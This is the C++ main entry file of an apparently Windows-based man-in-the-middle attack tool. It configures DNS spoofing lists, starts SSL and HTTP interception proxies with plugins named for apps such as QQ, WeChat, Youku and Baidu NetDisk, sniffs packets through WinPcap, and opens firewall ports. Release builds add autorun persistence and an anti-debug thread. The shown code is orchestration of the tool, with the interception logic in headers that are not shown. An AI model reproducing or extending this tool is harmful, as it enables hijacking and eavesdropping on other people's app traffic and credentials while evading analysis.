#include "PreparePacket.h"
#include <algorithm>
#include <windows.h>
#include <winsock2.H>
#include <Iptypes.h >
#include <iphlpapi.h>
#include <string>
#include <iostream>
#include <vector>
#include <conio.h>
#include <DbgHelp.h>
#include <stdlib.h>
#include <string.h>
#include "include\\pcap.h"
#include "include\\pcap\\pcap.h"
#include "main.h"
#include "attacker.h"
#include "Public.h"
#include "Packet.h"
#include "snifferpacket.h"
#include "NetworkDevice.h"
#include "Confiig.h"

#include "attack.h"
#include "ssl\\sslentry.h"
#include "winpcap.h"

#include "HttpUtils.h"
#include "cipher/CryptoUtils.h"
#include "ssl/WeixinAndroid.h"
#include "security.h"
#include "FileOper.h"
#include "informer.h"
#include "utils/Tools.h"
#include "cipher/RSA.h"
#include "dnsutils/DnsProxy.h"
#include "ssl/HttpProxyListener.h"
#include "ssl/SSLProxyListener.h"
#include "ssl/informerServer.h"
#include "ssl/baofeng.h"
#include "ssl/QQManager.h"
#include "ssl/QQAndroid.h"
#include "cipher/sha1.h"
#include "cipher/UrlCodec.h"
#include "cipher/Base64.h"

#include "support/aos_crc64.h"
#include "ssl/HuYaPlugin.h"
#include "ssl/YoukuPC.h"
#include "ssl/QQ.h"
#include "ssl/Plugin2345.h"
#include "ssl/aliProtect.h"
#include "ssl/qukan.h"
#include "gateWay/gateway.h"
#include "gateWay/gateway.h"
#include "DnsUtils/dnsUtils.h"
#include "Utils/basesocket.h"
#include "ssl/IqiyiPlugin.h"
#include "ssl/WpsPlugin.h"
#include "ssl/QQ.h"
#include "Utils/simpleJson.h"
#include "cipher/compression.h"
#include "ssl/baiduNetDisk.h"
#include "ssl/peanutShell.h"
#include <conio.h>
#include "myDvert.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Advapi32.lib")

#pragma comment(lib,"./lib\\wpcap.lib")
#pragma comment(lib,"./lib\\wpcap.dll")
#pragma comment(lib,"./lib\\zlib.lib")
#pragma comment(lib,"./lib\\libcrypto.lib")
#pragma comment(lib,"./lib\\libssl.lib")
#pragma comment(lib,"./lib\\openssl.lib")

//#define WINDIVERT_APPROACH

using namespace std;


int gAttackMode = 0;


void test() {

}


int main(int argc, char** argv)
{
#ifdef _DEBUG
	test();
#endif

	int	ret = 0;
	char szout[1024];

	string username = "";
	string password = "";
	int netcard_target = -1;
	if (argc >= 4)
	{
		username = argv[1];
		password = argv[2];
		netcard_target = atoi(argv[3]);
	}

	HANDLE hMutext = (HANDLE)Public::singleInstance();
	if (hMutext == FALSE)
	{
		printf("program has already been running\n");
		ret = _getch();
		exit(-1);
	}

	WSADATA	stWsa = { 0 };
	ret = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (ret)
	{
		printf("WSAStartup error code:%d\n", GetLastError());
		ret=_getch();
		exit(-1);
	}

	string path = Public::getpath();
	SetCurrentDirectoryA(path.c_str());

	int winpcapDelay = 1;
	int opensslctrl = 0;
	unsigned long serverIP = 0;
	char szgwmac[64] = { 0 };
	string servername = "";
	vector<string> gDnsAttackList = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,
		&opensslctrl, &gAttackMode, szgwmac, servername);
	if (gDnsAttackList.size() == 0) {
		printf("parse config file:%s error\r\n", CONFIG_FILENAME);
		ret = _getch();
		return -1;
	}

	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, gDnsAttackList);
	printf("parse dns total:%u\r\n", dnsItemCnt);
	
	ret = Security::loginCheck(gAttackMode, username, password);
	if (ret <= 0)
	{
		printf("username or password error\r\n");
		ret = _getch();
		exit(-1);
	}
	
	string adaptername = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcard_target,&gDnsServer);
	if (adaptername == "")
	{
		printf("select Netcard error\r\n");
		ret = _getch();
		return -1;
	}

	if (gAttackMode == ATTACK_TEST_MODE)
	{
		serverIP = gLocalIP;
	}
	else if (gAttackMode == ATTACK_SERVER_MODE)
	{
		//make sure serverip is correct in this mode
	}
	else if (gAttackMode == ATTACK_CLIENT_MODE)
	{
		//make sure serverip is correct in this mode
	}

#ifndef _DEBUG
	ret = Tools::autorun(username, password, netcard_target);
	DWORD debugTd = 0;
	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Security::antiDebug, 0,
		STACK_SIZE_PARAM_IS_A_RESERVATION, &debugTd));
#endif

	string devname = string(WINPCAP_NETCARD_NAME_PREFIX) + adaptername;
	pcap_t* pcapt = Winpcap::init(devname, winpcapDelay, gNetmask);
	if (pcapt == 0)
	{
		printf("winpcap init error\r\n");
		ret = _getch();
		return -1;
	}
	printf("device:%s,mask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcapDelay);

	//vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
	auto iter = unique(gDnsAttackList.begin(), gDnsAttackList.end());
	gDnsAttackList.erase(iter, gDnsAttackList.end());

	vector<string> gHostAttackList = gDnsAttackList;
	gHostAttackList.push_back(HttpUtils::getIPstr(serverIP));
	gHostAttackList.push_back(HttpUtils::getIPstr(gLocalIP));
	gHostAttackList.push_back("127.0.0.1");

	ret = Config::shiftDnsFormat(gDnsAttackList);

	DnsUitls* dnsutils = new DnsUitls(gDnsAttackList);

	DWORD cmode = 0;
	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
	ret = GetConsoleMode(hc, &cmode);
	//nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);

	printf("checking encryption files,please wait...\r\n");
	string pluginPath = Public::getPluginPath();
	ret = FileOper::checkFileCryption(pluginPath);

	gServerIP = serverIP;
	gLocalPath = path;

	in_addr ia = { 0 };
	ia.S_un.S_addr = gLocalIP;
	gstrLocalIP = inet_ntoa(ia);
	ia.S_un.S_addr = gServerIP;
	gstrServerIP = inet_ntoa(ia);
	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIP, gLocalIPV6);

	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE) {

		ret = Tools::addFirewallPort(HTTP_PORT, "HTTP", "TCP");
		ret = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
		ret = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");

		ret = SSLEntry::sslEntry(serverIP, gLocalIP, path, opensslctrl, gDnsAttackList, gHostAttackList, gAttackMode);

		ret = Tools::setNetworkParams();

		printf("server has been ready to work...\r\n");
	}

	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE) {
		string searchpath = gLocalPath + "plugin\\";
		vector<string>usernames;
		ret = FileOper::searchDir((char*)searchpath.c_str(), usernames);
		
		for (int i = 0; i < usernames.size(); i++) {
			printf("\r\n%d.\t\t%s\r\n",i, usernames[i].c_str());
		}

		do
		{
			int packnum = 0;
			printf("\r\nPlease input the number of the server packet:\r\n");
			//scanf("%d", &packnum);
			if (packnum < usernames.size() && packnum >= 0) {
				//lstrcpyA(G_USERNAME, usernames[packnum].c_str());
				break;
			}
		} while (1);
	}

	if (gAttackMode == ATTACK_SERVER_MODE)
	{
		//nRetCode = Tools::initException(hMutext, username, password, netcard_selected);
		Sleep(-1);
	}

	//printf("set server ip:%s,attack ip:%s,default user:%s\r\n", servername.c_str(), HttpUtils::getIPstr(localIP).c_str(),G_USERNAME);
	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）

	if (gAttackMode == ATTACK_CLIENT_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE)
	{
		string userpluginPath = Public::getDefaultUserPluginPath();
		ret = access(userpluginPath.c_str(), 0);
		if (ret)
		{
			log( "attack data store:%s not exist!\r\n", G_USERNAME);
			ret=_getch();
			exit(-1);
		}

		if (0) {
			printf("parsing gateway mac and ip,please wait...\r\n");
			Gateway* gateway = new Gateway(pcapt, serverIP, gLocalIP, gLocalMac);
			int totalpack = gateway->getGateWay();
			if (totalpack)
			{
				GATEWAYPARAM p = gateway->getGatewayParam();
				printf("gate way mac:%s,mac count:%d,source ip:%s\r\n",
					HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
			}
		}
		printf("attacker has been ready to work...\r\n");

#ifndef WINDIVERT_APPROACH
		ret = SnifferPacket::peeping(pcapt, serverIP, gLocalIP, userpluginPath, gAttackMode);
		pcap_close(pcapt);
#else
		ret = CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE) winDivert,(LPVOID)gLocalIP,0,0));
		Sleep(-1);
#endif		
	}

	return ret;
}

/*
v4地址转化v6地址，再把前96位补零
0000:0000:0000:0000:0000:0000:874B:2B34或者::874B:2B34
*/

//cmd执行程序时容易卡住 取消快速编辑模式

//全局变量空间一般比较大，因此大小超过1M的变量尽量声明为全局变量或者静态变量。

//统计代码行数 ^b*[^:b#/]+.*$